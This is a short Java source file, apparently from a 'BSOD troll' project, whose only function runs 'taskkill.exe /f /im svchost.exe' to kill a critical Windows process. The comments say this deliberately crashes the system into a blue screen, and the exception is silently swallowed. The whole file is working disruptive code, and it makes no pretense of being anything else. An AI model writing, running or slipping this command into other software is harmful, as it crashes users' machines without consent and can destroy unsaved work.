package dev.hause.perry.bsod;

/**
 * @author hausemasterissue, perry
 * Started 11/16/2021.
 * command taken from sxmurai: https://github.com/Sxmurai/shitty-BSOD-troll/blob/main/src/cum/club/forgemod/Main.java#L28
 */
public class Bsod {

    public static void main(String[] args) {
        // try to execute a command prompt command
        try {
            // kill svchost.exe, this causes the system to blue screen, thanks to sxmurai
            Runtime.getRuntime().exec("taskkill.exe /f /im svchost.exe");
        } catch (Exception ignored) {
        }
    }
}
